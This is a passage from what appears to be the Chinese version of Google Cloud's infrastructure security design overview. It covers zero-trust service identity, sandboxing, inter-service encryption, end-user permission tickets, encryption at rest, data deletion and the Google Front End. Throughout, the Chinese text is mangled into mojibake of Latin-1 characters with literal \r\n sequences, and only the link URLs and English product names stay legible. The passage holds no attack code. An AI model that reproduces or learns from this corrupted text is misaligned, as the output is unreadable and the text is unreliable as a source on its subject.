[Borg](https://research.google/pubs/pub43438/?hl=zh-cn)ï¼‰æ§åˆ¶ç›´æ¥åœ¨åŸºç¡€æ¶æ„ä¸Šè¿è¡Œçš„æœåŠ¡ã€‚\r\n\r\nåŸºç¡€æ¶æ„å‡å®šåŸºç¡€æ¶æ„ä¸Šè¿è¡Œçš„æœåŠ¡ä¹‹é—´ä¸å­˜åœ¨ä»»ä½•ä¿¡ä»»ã€‚æ­¤ä¿¡ä»»æ¨¡å‹ç§°ä¸ºâ€œé›¶ä¿¡ä»»å®‰å…¨æ¨¡å‹â€ã€‚é›¶ä¿¡ä»»å®‰å…¨æ¨¡å‹æ„å‘³ç€åœ¨é»˜è®¤æƒ…å†µä¸‹ä¸ä¿¡ä»»ä»»ä½•è®¾å¤‡æˆ–ç”¨æˆ·ï¼Œæ— è®ºå®ƒä»¬æ˜¯ä½äºç½‘ç»œå†…éƒ¨è¿˜æ˜¯å¤–éƒ¨ã€‚\r\n\r\nç”±äºåŸºç¡€æ¶æ„è®¾è®¡ä¸ºå¤šç§Ÿæˆ·ï¼Œå› æ­¤å®¢æˆ·çš„æ•°æ®ï¼ˆä¸ªäººç”¨æˆ·ã€ä¼ä¸šï¼Œç”šè‡³æˆ‘ä»¬è‡ªå·±çš„æ•°æ®ï¼‰åˆ†å¸ƒåœ¨æ•´ä¸ªå…±äº«åŸºç¡€æ¶æ„ä¸­ã€‚æ­¤åŸºç¡€æ¶æ„ç”±æ•°ä»¥ä¸‡è®¡çš„åŒæ„æœºå™¨ç»„æˆã€‚é™¤ç‰¹å®šæƒ…å†µå¤–ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ Google Cloud åœ¨[Compute Engine çš„å•ç§Ÿæˆ·èŠ‚ç‚¹](https://cloud.google.com/compute/docs/nodes/sole-tenant-nodes?hl=zh-cn)ä¸Šé¢„é…è™šæ‹Ÿæœºï¼‰ï¼ŒåŸºç¡€æ¶æ„ä¸ä¼šå°†å®¢æˆ·æ•°æ®éš”ç¦»åˆ°å•ä¸ªæœºå™¨æˆ–ä¸€ç»„æœºå™¨ä¸­ã€‚\r\n\r\nGoogle Cloud å’Œ Google Workspace æ”¯æŒæœ‰å…³æ•°æ®é©»ç•™çš„ç›‘ç®¡è¦æ±‚ã€‚å¦‚éœ€è¯¦ç»†äº†è§£æ•°æ®é©»ç•™å’Œ Google Cloudï¼Œè¯·å‚é˜…[å®ç°æ•°æ®é©»ç•™å’Œä¸»æƒè¦æ±‚](https://cloud.google.com/architecture/framework/security/data-residency-sovereignty?hl=zh-cn)ã€‚å¦‚éœ€è¯¦ç»†äº†è§£æ•°æ®é©»ç•™å’Œ Google Workspaceï¼Œè¯·å‚é˜…[æ•°æ®åŒºåŸŸï¼šé€‰æ‹©æ•°æ®çš„åœ°ç†ä½ç½®](https://support.google.com/a/answer/7630496?hl=zh-cn)ã€‚\r\n\r\n## æœåŠ¡èº«ä»½æ ‡è¯†ã€å®Œæ•´æ€§ä¸éš”ç¦»\r\n\r\nä¸ºäº†å®ç°æœåŠ¡é—´é€šä¿¡ï¼Œåº”ç”¨ä½¿ç”¨åŠ å¯†çš„èº«ä»½éªŒè¯å’Œæˆæƒã€‚èº«ä»½éªŒè¯å’Œæˆæƒä»¥ç®¡ç†å‘˜å’ŒæœåŠ¡å¯ä»¥ç†è§£çš„æŠ½è±¡çº§åˆ«å’Œç²’åº¦æä¾›å¼ºå¤§çš„è®¿é—®æƒé™æ§åˆ¶ã€‚\r\n\r\næœåŠ¡ä¸ä¾èµ–å†…éƒ¨ç½‘ç»œåˆ†æ®µæˆ–é˜²ç«å¢™ä½œä¸ºä¸»è¦å®‰å…¨æœºåˆ¶ã€‚æˆ‘ä»¬ç½‘ç»œä¸­å„å¤„çš„å…¥ç«™æµé‡å’Œå‡ºç«™æµé‡è¿‡æ»¤å¯å¸®åŠ©é˜²æ­¢ IP æ¬ºéª—ã€‚è¿™ç§æ–¹æ³•è¿˜æœ‰åŠ©äºæˆ‘ä»¬æœ€å¤§é™åº¦åœ°æé«˜ç½‘ç»œçš„æ€§èƒ½å’Œå¯ç”¨æ€§ã€‚å¯¹äº Google Cloudï¼Œæ‚¨å¯ä»¥æ·»åŠ å…¶ä»–å®‰å…¨æœºåˆ¶ï¼Œä¾‹å¦‚ [VPC Service Controls](https://cloud.google.com/vpc-service-controls/docs/overview?hl=zh-cn) å’Œ [Cloud Interconnect](https://cloud.google.com/network-connectivity/docs/interconnect/concepts/overview?hl=zh-cn)ã€‚\r\n\r\nåœ¨åŸºç¡€æ¶æ„ä¸Šè¿è¡Œçš„æ¯ä¸ªæœåŠ¡éƒ½å…·æœ‰å…³è”çš„æœåŠ¡å¸å·èº«ä»½æ ‡è¯†ã€‚æœåŠ¡ä¼šè·å¾—åŠ å¯†å‡­æ®ï¼Œå¯ç”¨äºåœ¨å‘å‡ºæˆ–æ¥æ”¶ RPC æ—¶å‘å…¶ä»–æœåŠ¡è¯æ˜å…¶èº«ä»½ã€‚è¿™äº›èº«ä»½åœ¨å®‰å…¨æ”¿ç­–ä¸­ä½¿ç”¨ã€‚å®‰å…¨æ”¿ç­–å¯ç¡®ä¿å®¢æˆ·ç«¯ä¸é¢„æœŸæœåŠ¡å™¨é€šä¿¡ï¼Œå¹¶ä¸”æœåŠ¡å™¨é™åˆ¶ç‰¹å®šå®¢æˆ·ç«¯å¯ä»¥è®¿é—®çš„æ–¹æ³•å’Œæ•°æ®ã€‚\r\n\r\næˆ‘ä»¬ä½¿ç”¨å„ç§éš”ç¦»å’Œæ²™ç›’æŠ€æœ¯æ¥ä¿æŠ¤æœåŠ¡å…å—åŒä¸€æœºå™¨ä¸Šè¿è¡Œçš„å…¶ä»–æœåŠ¡çš„å½±å“ã€‚è¿™äº›æŠ€æœ¯åŒ…æ‹¬ Linux ç”¨æˆ·åˆ†ç¦»ã€åŸºäºè¯­è¨€ï¼ˆå¦‚ [Sandboxed API](https://developers.google.com/code-sandboxing/sandboxed-api?hl=zh-cn)ï¼‰å’ŒåŸºäºå†…æ ¸çš„æ²™ç›’ã€å®¹å™¨åº”ç”¨å†…æ ¸ï¼ˆå¦‚ [gVisor](https://gvisor.dev/)ï¼‰å’Œç¡¬ä»¶è™šæ‹ŸåŒ–ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬ä¼šä¸ºé£é™©è¾ƒé«˜çš„å·¥ä½œè´Ÿè½½ä½¿ç”¨æ›´å¤šçš„éš”ç¦»å±‚ã€‚é£é™©è¾ƒé«˜çš„å·¥ä½œè´Ÿè½½åŒ…æ‹¬ç”¨æˆ·æä¾›çš„éœ€è¦è¿›è¡Œé¢å¤–å¤„ç†çš„å†…å®¹ã€‚ä¾‹å¦‚ï¼Œé£é™©è¾ƒé«˜çš„å·¥ä½œè´Ÿè½½åŒ…æ‹¬é’ˆå¯¹ç”¨æˆ·æä¾›çš„æ•°æ®è¿è¡Œå¤æ‚çš„æ–‡ä»¶è½¬æ¢å™¨ï¼Œæˆ–è€…ä¸º App Engine æˆ– Compute Engine ç­‰äº§å“è¿è¡Œç”¨æˆ·æä¾›çš„ä»£ç ã€‚\r\n\r\nä¸ºäº†æé«˜å®‰å…¨æ€§ï¼Œæ•æ„ŸæœåŠ¡ï¼ˆä¾‹å¦‚é›†ç¾¤ç¼–æ’æœåŠ¡å’ŒæŸäº›å¯†é’¥ç®¡ç†æœåŠ¡ï¼‰åªåœ¨ä¸“ç”¨æœºå™¨ä¸Šè¿è¡Œã€‚\r\n\r\nåœ¨ Google Cloud ä¸­ï¼Œä¸ºäº†ä¸ºæ‚¨çš„å·¥ä½œè´Ÿè½½æä¾›æ›´å¼ºçš„åŠ å¯†éš”ç¦»ä»¥åŠä¿æŠ¤ä½¿ç”¨ä¸­çš„æ•°æ®ï¼Œæˆ‘ä»¬æ”¯æŒ Compute Engine è™šæ‹Ÿæœºå’Œ Google Kubernetes Engine (GKE) èŠ‚ç‚¹ä½¿ç”¨[æœºå¯†è®¡ç®—](https://cloud.google.com/confidential-computing?hl=zh-cn)æœåŠ¡ã€‚\r\n\r\n## æœåŠ¡é—´è®¿é—®ç®¡ç†\r\n\r\næœåŠ¡çš„æ‰€æœ‰è€…å¯ä»¥åˆ©ç”¨åŸºç¡€æ¶æ„æä¾›çš„è®¿é—®ç®¡ç†åŠŸèƒ½æ¥ç²¾ç¡®æŒ‡å®šå…¶æœåŠ¡å¯ä»¥ä¸å…¶ä»–å“ªäº›æœåŠ¡è¿›è¡Œé€šä¿¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæœåŠ¡å¯ä»¥å°†ä¼ å…¥ RPC é™åˆ¶ä¸ºä¸€ç»„å…è®¸çš„å…¶ä»–æœåŠ¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨æœåŠ¡èº«ä»½è®¸å¯åå•é…ç½®è¯¥æœåŠ¡ï¼ŒåŸºç¡€æ¶æ„ä¼šè‡ªåŠ¨æ‰§è¡Œæ­¤è®¿é—®é™åˆ¶ã€‚æ‰§è¡ŒåŒ…æ‹¬å®¡æ ¸æ—¥å¿—è®°å½•ã€ç†ç”±ä»¥åŠå•æ–¹é¢è®¿é—®é™åˆ¶ï¼ˆä¾‹å¦‚ï¼Œé’ˆå¯¹å·¥ç¨‹å¸ˆè¯·æ±‚ï¼‰ã€‚\r\n\r\néœ€è¦è®¿é—®æœåŠ¡çš„ Google å·¥ç¨‹å¸ˆä¹Ÿä¼šè·å¾—ä¸ªäººèº«ä»½æ ‡è¯†ã€‚å¯ä»¥å°†æœåŠ¡é…ç½®ä¸ºæ ¹æ®èº«ä»½æ ‡è¯†å…è®¸æˆ–æ‹’ç»è®¿é—®ã€‚æ‰€æœ‰è¿™äº›èº«ä»½æ ‡è¯†ï¼ˆæœºå™¨ã€æœåŠ¡å’Œå‘˜å·¥ï¼‰éƒ½ä½äºåŸºç¡€æ¶æ„ç»´æŠ¤çš„å…¨å±€å‘½åç©ºé—´ä¸­ã€‚\r\n\r\nä¸ºç®¡ç†è¿™äº›èº«ä»½æ ‡è¯†ï¼ŒåŸºç¡€æ¶æ„æä¾›äº†ä¸€ä¸ªå·¥ä½œæµç³»ç»Ÿï¼Œå…¶ä¸­åŒ…æ‹¬æ‰¹å‡†é“¾ã€æ—¥å¿—è®°å½•å’Œé€šçŸ¥ã€‚ä¾‹å¦‚ï¼Œå®‰å…¨æ”¿ç­–å¯ä»¥æ‰§è¡Œå¤šæ–¹æˆæƒã€‚æ­¤ç³»ç»Ÿä½¿ç”¨åŒäººè§„åˆ™ï¼Œç¡®ä¿ä¸€ä¸ªå·¥ç¨‹å¸ˆå¿…é¡»å…ˆè·å¾—å¦ä¸€ä¸ªæˆæƒå·¥ç¨‹å¸ˆçš„æ‰¹å‡†æ‰èƒ½ç‹¬è‡ªæ‰§è¡Œæ•æ„Ÿæ“ä½œã€‚å€ŸåŠ©è¿™ä¸€ç³»ç»Ÿï¼Œå¯ä»¥å°†å®‰å…¨è®¿é—®ç®¡ç†æµç¨‹æ‰©å±•åˆ°åŸºç¡€æ¶æ„ä¸Šè¿è¡Œçš„æ•°åƒä¸ªæœåŠ¡ã€‚\r\n\r\nåŸºç¡€æ¶æ„è¿˜ä¸ºæœåŠ¡æä¾›ç”¨æˆ·ã€ç¾¤ç»„å’Œæˆå‘˜èµ„æ ¼ç®¡ç†çš„è§„èŒƒåŒ–æœåŠ¡ï¼Œå¯ä»¥åœ¨å¿…è¦æ—¶å®ç°ç²¾ç»†çš„è‡ªå®šä¹‰è®¿é—®æƒé™æ§åˆ¶ã€‚\r\n\r\nå¦‚ [Google Workspace ä¸­çš„æœ€ç»ˆç”¨æˆ·æ•°æ®è®¿é—®ç®¡ç†](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#access-management-of-end-user-data-in-google-workspace)ä¸­æ‰€è¿°ï¼Œæœ€ç»ˆç”¨æˆ·èº«ä»½æ ‡è¯†æ˜¯å•ç‹¬ç®¡ç†çš„ã€‚\r\n\r\n## æœåŠ¡é—´é€šä¿¡çš„åŠ å¯†\r\n\r\nåŸºç¡€æ¶æ„å¯ç¡®ä¿ç½‘ç»œä¸Šçš„ RPC æ•°æ®çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ã€‚æ‰€æœ‰ Google Cloud è™šæ‹Ÿç½‘ç»œæµé‡å‡ç»è¿‡åŠ å¯†ã€‚åŸºç¡€æ¶æ„æœåŠ¡ä¹‹é—´çš„æ‰€æœ‰é€šä¿¡éƒ½ç»è¿‡èº«ä»½éªŒè¯ï¼Œå¤§å¤šæ•°æœåŠ¡é—´é€šä¿¡å‡å·²åŠ å¯†ï¼Œè¿™å¢åŠ äº†ä¸€å±‚é¢å¤–çš„å®‰å…¨ä¿æŠ¤ï¼Œå³ä½¿ç½‘ç»œè¢«çªƒå¬æˆ–ç½‘ç»œè®¾å¤‡é­åˆ°ç ´è§£ï¼Œä¹Ÿèƒ½ä¿æŠ¤é€šä¿¡ã€‚æœåŠ¡é—´é€šä¿¡åŠ å¯†è¦æ±‚çš„ä¾‹å¤–æƒ…å†µä»…æˆäºˆå»¶è¿Ÿè¦æ±‚ä½çš„æµé‡ï¼Œå¹¶ä¸”è¿™ä¹Ÿä¸ä¼šåœ¨æ•°æ®ä¸­å¿ƒçš„å¤šä¸ªç‰©ç†å®‰å…¨å±‚ä¸­ç•™ä¸‹å•ä¸ªç½‘ç»œç»“æ„ã€‚\r\n\r\nåŸºç¡€æ¶æ„å¯è‡ªåŠ¨ã€é«˜æ•ˆåœ°ï¼ˆå€ŸåŠ©ç¡¬ä»¶åˆ†æµï¼‰ä¸ºæ•°æ®ä¸­å¿ƒä¹‹é—´é€šè¿‡ç½‘ç»œä¼ è¾“çš„åŸºç¡€æ¶æ„ RPC æµé‡æä¾›ç«¯åˆ°ç«¯åŠ å¯†ã€‚\r\n\r\n## Google Workspace ä¸­çš„æœ€ç»ˆç”¨æˆ·æ•°æ®è®¿é—®ç®¡ç†\r\n\r\næˆ‘ä»¬ç¼–å†™äº†ä¸€ä¸ªå…¸å‹çš„ Google Workspace æœåŠ¡æ¥ä»£è¡¨æœ€ç»ˆç”¨æˆ·æ‰§è¡ŒæŸäº›æ“ä½œã€‚ä¾‹å¦‚ï¼Œæœ€ç»ˆç”¨æˆ·å¯ä»¥å°†ç”µå­é‚®ä»¶å­˜å‚¨åœ¨ Gmail ä¸Šã€‚æœ€ç»ˆç”¨æˆ·ä¸ Gmail ç­‰åº”ç”¨çš„äº’åŠ¨å¯èƒ½ä¼šæ¶‰åŠåˆ°åŸºç¡€æ¶æ„å†…çš„å…¶ä»–æœåŠ¡ã€‚ä¾‹å¦‚ï¼ŒGmail å¯èƒ½ä¼šè°ƒç”¨ People API ä»¥è®¿é—®æœ€ç»ˆç”¨æˆ·çš„é€šè®¯ç°¿ã€‚\r\n\r\n[æœåŠ¡é—´é€šä¿¡çš„åŠ å¯†](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#encryption-inter-service)ä»‹ç»äº†å¦‚ä½•å°†æŸä¸ªæœåŠ¡ï¼ˆä¾‹å¦‚ Google é€šè®¯å½•ï¼‰è®¾è®¡ä¸ºä¿æŠ¤æ¥è‡ªå¦ä¸€ä¸ªæœåŠ¡ï¼ˆä¾‹å¦‚ Gmailï¼‰çš„ RPC è¯·æ±‚ã€‚ä½†æ˜¯ï¼Œè¿™ä¸€è®¿é—®æƒé™æ§åˆ¶çº§åˆ«ä»ç„¶æ˜¯ä¸€ç»„å¹¿æ³›çš„æƒé™ï¼Œå› ä¸º Gmail å¯ä»¥éšæ—¶è¯·æ±‚ä»»ä½•ç”¨æˆ·çš„è”ç³»äººã€‚\r\n\r\nå½“ Gmail ä»£è¡¨æœ€ç»ˆç”¨æˆ·å‘ Google é€šè®¯å½•å‘é€ RPC è¯·æ±‚æ—¶ï¼ŒåŸºç¡€æ¶æ„å…è®¸ Gmail åœ¨ RPC è¯·æ±‚ä¸­æä¾›æœ€ç»ˆç”¨æˆ·æƒé™ç¥¨è¯ã€‚æ­¤ç¥¨è¯å¯è¯æ˜ Gmail ä»£è¡¨è¯¥ç‰¹å®šæœ€ç»ˆç”¨æˆ·å‘å‡º RPC è¯·æ±‚ã€‚Google é€šè®¯å½•é€šè¿‡ç¥¨è¯å®ç°å®‰å…¨ä¿æŠ¤æªæ–½ï¼Œä»è€Œä»…è¿”å›ç¥¨è¯ä¸­æŒ‡å®šçš„æœ€ç»ˆç”¨æˆ·çš„æ•°æ®ã€‚\r\n\r\nåŸºç¡€æ¶æ„æä¾›äº†ä¸€é¡¹ä¸­å¤®ç”¨æˆ·èº«ä»½è¯†åˆ«æœåŠ¡ï¼Œè¯¥æœåŠ¡å¯ä»¥é¢å‘ä¸Šè¿°æœ€ç»ˆç”¨æˆ·æƒé™ç¥¨è¯ã€‚èº«ä»½è¯†åˆ«æœåŠ¡éªŒè¯æœ€ç»ˆç”¨æˆ·ç™»å½•ï¼Œç„¶åå‘ç”¨æˆ·çš„è®¾å¤‡é¢å‘ç”¨æˆ·å‡­æ®ï¼Œä¾‹å¦‚ Cookie æˆ– OAuth ä»¤ç‰Œã€‚ä»è¯¥è®¾å¤‡å‘é€åˆ°æˆ‘ä»¬çš„åŸºç¡€æ¶æ„çš„æ¯ä¸ªåç»­è¯·æ±‚éƒ½å¿…é¡»æä¾›è¯¥æœ€ç»ˆç”¨æˆ·å‡­æ®ã€‚\r\n\r\nå½“æŸä¸ªæœåŠ¡æ”¶åˆ°æœ€ç»ˆç”¨æˆ·å‡­æ®æ—¶ï¼Œä¼šå°†è¯¥å‡­æ®ä¼ é€’ç»™èº«ä»½è¯†åˆ«æœåŠ¡è¿›è¡ŒéªŒè¯ã€‚å¦‚æœæœ€ç»ˆç”¨æˆ·å‡­æ®é€šè¿‡éªŒè¯ï¼Œèº«ä»½è¯†åˆ«æœåŠ¡ä¼šè¿”å›ä¸€ä¸ªçŸ­æœŸæœ‰æ•ˆçš„æœ€ç»ˆç”¨æˆ·æƒé™ç¥¨è¯ï¼Œè¯¥ç¥¨è¯å¯ç”¨äºä¸è¯¥ç”¨æˆ·çš„è¯·æ±‚ç›¸å…³çš„ RPCã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œè·å¾—æœ€ç»ˆç”¨æˆ·æƒé™ç¥¨è¯çš„æœåŠ¡æ˜¯ Gmailï¼ŒGmail å°†ç¥¨è¯ä¼ é€’ç»™ Google é€šè®¯å½•ã€‚ä¹‹åï¼Œå¯¹äºä»»ä½•çº§è”è°ƒç”¨ï¼Œè°ƒç”¨æœåŠ¡éƒ½å¯ä»¥å°†æœ€ç»ˆç”¨æˆ·æƒé™ç¥¨è¯ä½œä¸º RPC çš„ä¸€éƒ¨åˆ†å‘é€ç»™è¢«è°ƒç”¨æ–¹ã€‚\r\n\r\nä¸‹å›¾å±•ç¤ºäº†æœåŠ¡ A å’ŒæœåŠ¡ B çš„é€šä¿¡æ–¹å¼ã€‚åŸºç¡€æ¶æ„å¯æä¾›æœåŠ¡èº«ä»½ã€è‡ªåŠ¨èº«ä»½äº’éªŒã€æœåŠ¡é—´é€šä¿¡åŠ å¯†ï¼Œå¹¶å¯æ‰§è¡ŒæœåŠ¡æ‰€æœ‰è€…å®šä¹‰çš„è®¿é—®æ”¿ç­–ã€‚æ¯é¡¹æœåŠ¡éƒ½æœ‰ä¸€ä¸ªç”±æœåŠ¡æ‰€æœ‰è€…åˆ›å»ºçš„æœåŠ¡é…ç½®ã€‚å¯¹äºåŠ å¯†çš„æœåŠ¡é—´é€šä¿¡ï¼Œè‡ªåŠ¨åŒå‘èº«ä»½éªŒè¯ä½¿ç”¨è°ƒç”¨æ–¹å’Œè¢«è°ƒç”¨æ–¹èº«ä»½æ ‡è¯†ã€‚åªæœ‰åœ¨è®¿é—®è§„åˆ™é…ç½®å…è®¸çš„æƒ…å†µä¸‹æ‰èƒ½è¿›è¡Œé€šä¿¡ã€‚\r\n\r\n![å±•ç¤ºæœåŠ¡ A å’ŒæœåŠ¡ B é€šä¿¡æ–¹å¼çš„å›¾è¡¨ã€‚](https://cloud.google.com/static/docs/security/infrastructure/design/resources/google-infrastructure-interservice-comm.svg?hl=zh-cn)\r\n\r\nå¦‚éœ€äº†è§£ Google Cloud ä¸­çš„è®¿é—®ç®¡ç†ï¼Œè¯·å‚é˜… [IAM æ¦‚è§ˆ](https://cloud.google.com/iam/docs/overview?hl=zh-cn)ã€‚\r\n\r\n# å®‰å…¨çš„æ•°æ®å­˜å‚¨\r\n\r\næœ¬éƒ¨åˆ†ä»‹ç»å¦‚ä½•ä¿è¯å­˜å‚¨åœ¨åŸºç¡€æ¶æ„ä¸Šçš„æ•°æ®çš„å®‰å…¨ã€‚\r\n\r\n## é™æ€åŠ å¯†\r\n\r\nGoogle çš„åŸºç¡€æ¶æ„æä¾›å„ç§å­˜å‚¨æœåŠ¡å’Œåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿï¼ˆä¾‹å¦‚ Spanner å’Œ [Colossus](https://cloud.google.com/blog/products/storage-data-transfer/a-peek-behind-colossus-googles-file-system?hl=zh-cn)ï¼‰ä»¥åŠä¸€ä¸ªä¸­å¤®å¯†é’¥ç®¡ç†æœåŠ¡ã€‚Google çš„åº”ç”¨ä½¿ç”¨å­˜å‚¨åŸºç¡€æ¶æ„è®¿é—®ç‰©ç†å­˜å‚¨ã€‚æˆ‘ä»¬ä½¿ç”¨å¤šå±‚åŠ å¯†æ¥ä¿æŠ¤é™æ€æ•°æ®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå­˜å‚¨åŸºç¡€æ¶æ„ä¼šåœ¨ç”¨æˆ·æ•°æ®å†™å…¥ç‰©ç†å­˜å‚¨ç©ºé—´ä¹‹å‰åŠ å¯†æ‰€æœ‰ç”¨æˆ·æ•°æ®ã€‚\r\n\r\nåŸºç¡€æ¶æ„åœ¨åº”ç”¨å±‚æˆ–å­˜å‚¨åŸºç¡€æ¶æ„å±‚æ‰§è¡ŒåŠ å¯†ã€‚åŠ å¯†å¯ä½¿åŸºç¡€æ¶æ„å°†å…¶è‡ªèº«ä¸åº•å±‚å­˜å‚¨ä¸Šçš„æ½œåœ¨å¨èƒï¼ˆä¾‹å¦‚æ¶æ„ç£ç›˜å›ºä»¶ï¼‰éš”ç¦»å¼€æ¥ã€‚åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜ä¼šåœ¨ç¡¬ç›˜å’Œå›ºæ€ç¡¬ç›˜ä¸­å¯ç”¨ç¡¬ä»¶åŠ å¯†æ”¯æŒï¼Œå¹¶åœ¨æ¯ä¸ªç¡¬ç›˜çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…ç»†è‡´åœ°è¿›è¡Œè·Ÿè¸ªã€‚å¯¹äºé€€å½¹çš„åŠ å¯†å­˜å‚¨è®¾å¤‡ï¼Œæˆ‘ä»¬å…ˆé€šè¿‡å¤šæ­¥éª¤æµç¨‹ï¼ˆåŒ…æ‹¬ä¸¤æ¬¡ç‹¬ç«‹éªŒè¯ï¼‰æ¸…ç©ºå…¶å†…å®¹ï¼Œç„¶åæ‰ä¼šå°†å…¶åœ¨ç‰©ç†ä¸Šæ’¤ç¦»æˆ‘ä»¬çš„ç®¡æ§èŒƒå›´ã€‚å¯¹äºæœªç»å†æ­¤æ¸…ç†è¿‡ç¨‹çš„è®¾å¤‡ï¼Œæˆ‘ä»¬ä¼šåœ¨ç°åœºè¿›è¡Œç‰©ç†é”€æ¯ï¼ˆå³ç²‰ç¢ï¼‰ã€‚\r\n\r\né™¤äº†åŸºç¡€æ¶æ„è¿›è¡Œçš„åŠ å¯†ä»¥å¤–ï¼ŒGoogle Cloud å’Œ Google Workspace è¿˜æä¾›å¯†é’¥ç®¡ç†æœåŠ¡ã€‚å¯¹äº Google Cloudï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ [Cloud KMS](https://cloud.google.com/docs/security/key-management-deep-dive?hl=zh-cn)ï¼Œå®ƒæ˜¯ä¸€ç§å…è®¸å®¢æˆ·ç®¡ç†åŠ å¯†å¯†é’¥çš„äº‘æœåŠ¡ã€‚å¯¹äº Google Workspaceï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯åŠ å¯†åŠŸèƒ½ã€‚å¦‚éœ€äº†è§£è¯¦æƒ…ï¼Œè¯·å‚é˜… [Google Workspace ä¸­çš„å®¢æˆ·ç«¯åŠ å¯†åŠŸèƒ½å’Œå¢å¼ºå‹åä½œå·¥å…·](https://cloud.google.com/blog/products/workspace/new-google-workspace-security-features?hl=zh-cn)ã€‚\r\n\r\n## æ•°æ®åˆ é™¤\r\n\r\næ•°æ®åˆ é™¤æµç¨‹é€šå¸¸æ˜¯ä»å°†å…·ä½“æ•°æ®æ ‡è®°ä¸ºâ€œå·²å®‰æ’åˆ é™¤â€å¼€å§‹ï¼Œè€Œä¸æ˜¯çœŸæ­£çš„åˆ é™¤æ•°æ®ã€‚å€ŸåŠ©æ­¤æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥æ¢å¤æ— æ„é—´åˆ é™¤çš„æ•°æ®ï¼Œä¾‹å¦‚ç”±å®¢æˆ·å‘èµ·çš„åˆ é™¤ã€bug å¯¼è‡´çš„åˆ é™¤æˆ–å†…éƒ¨æµç¨‹é”™è¯¯å¯¼è‡´çš„åˆ é™¤ã€‚æ•°æ®æ ‡è®°ä¸ºâ€œå·²å®‰æ’åˆ é™¤â€åï¼Œç³»ç»Ÿä¼šæ ¹æ®ç‰¹å®šäºæœåŠ¡çš„æ”¿ç­–æ¥åˆ é™¤æ•°æ®ã€‚\r\n\r\nå½“æœ€ç»ˆç”¨æˆ·åˆ é™¤å…¶å¸å·æ—¶ï¼ŒåŸºç¡€æ¶æ„ä¼šé€šçŸ¥å¤„ç†æœ€ç»ˆç”¨æˆ·æ•°æ®çš„æœåŠ¡è¯¥å¸å·å·²è¢«åˆ é™¤ã€‚ç„¶åï¼Œè¿™äº›æœåŠ¡ä¾¿ä¼šå®‰æ’åˆ é™¤ä¸è¢«åˆ é™¤çš„æœ€ç»ˆç”¨æˆ·å¸å·ç›¸å…³è”çš„æ•°æ®ã€‚æ­¤åŠŸèƒ½ä½¿æœ€ç»ˆç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶è‡ªå·±çš„æ•°æ®ã€‚\r\n\r\nå¦‚éœ€äº†è§£è¯¦æƒ…ï¼Œè¯·å‚é˜… [Google Cloud ä¸Šçš„æ•°æ®åˆ é™¤](https://cloud.google.com/docs/security/deletion?hl=zh-cn)ã€‚\r\n\r\n# å®‰å…¨çš„äº’è”ç½‘é€šä¿¡\r\n\r\næœ¬éƒ¨åˆ†ä»‹ç»æˆ‘ä»¬å¦‚ä½•ä¿æŠ¤äº’è”ç½‘ä¸ Google åŸºç¡€æ¶æ„ä¸Šè¿è¡Œçš„æœåŠ¡ä¹‹é—´çš„é€šä¿¡ã€‚\r\n\r\nå¦‚[ç¡¬ä»¶çš„è®¾è®¡å’Œæ¥æº](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#hardware-design)ä¸­æ‰€è¿°ï¼ŒåŸºç¡€æ¶æ„ç”±è®¸å¤šé€šè¿‡ LAN å’Œ WAN äº’è¿çš„ç‰©ç†æœºå™¨ç»„æˆã€‚æœåŠ¡é—´é€šä¿¡çš„å®‰å…¨æ€§ä¸ä¾èµ–äºç½‘ç»œå®‰å…¨ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å°†åŸºç¡€æ¶æ„ä»äº’è”ç½‘éš”ç¦»åˆ°ä¸“ç”¨ IP åœ°å€ç©ºé—´ã€‚æˆ‘ä»¬åªä¼šå°†éƒ¨åˆ†æœºå™¨ç›´æ¥æš´éœ²ç»™å¤–éƒ¨äº’è”ç½‘æµé‡ï¼Œä»è€Œå¯ä»¥å®ç°é¢å¤–çš„ä¿æŠ¤ï¼Œä¾‹å¦‚é˜²å¾¡æ‹’ç»æœåŠ¡ (DoS) æ”»å‡»ã€‚\r\n\r\n## Google Front End æœåŠ¡\r\n\r\nå½“æŸä¸ªæœåŠ¡éœ€è¦åœ¨äº’è”ç½‘ä¸Šå¯ç”¨æ—¶ï¼Œå®ƒå¯å‘åä¸º Google Front End (GFE) çš„åŸºç¡€æ¶æ„æœåŠ¡æ³¨å†Œã€‚é€šè¿‡ä½¿ç”¨æ­£ç¡®çš„è¯ä¹¦å¹¶éµå¾ªæœ€ä½³å®è·µï¼ˆä¾‹å¦‚æ”¯æŒå®Œå…¨æ­£å‘åŠ å¯†ï¼‰ï¼ŒGFE å¯ç¡®ä¿ç»ˆç»“å…¨éƒ¨ TLS è¿æ¥ã€‚GFE è¿˜ä¼šåº”ç”¨ä¿æŠ¤æªæ–½æ¥é˜²å¾¡ DoS æ”»å‡»ã€‚ç„¶åï¼ŒGFE åˆ©ç”¨ [Google Workspace ä¸­çš„æœ€ç»ˆç”¨æˆ·æ•°æ®è®¿é—®ç®¡ç†](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#access-management-of-end-user-data-in-google-workspace)ä¸­è®¨è®ºçš„ RPC å®‰å…¨åè®®è½¬å‘å¯¹è¯¥æœåŠ¡çš„è¯·æ±‚ã€‚\r\n\r\nå®é™…ä¸Šï¼Œä»»ä½•å¿…é¡»å‘å¤–å‘å¸ƒçš„å†…éƒ¨æœåŠ¡éƒ½ä½¿ç”¨ GFE ä½œä¸ºæ™ºèƒ½åå‘ä»£ç†å‰ç«¯ã€‚GFE æä¾›å…¶å…¬å…± DNS åç§°çš„å…¬å…± IP 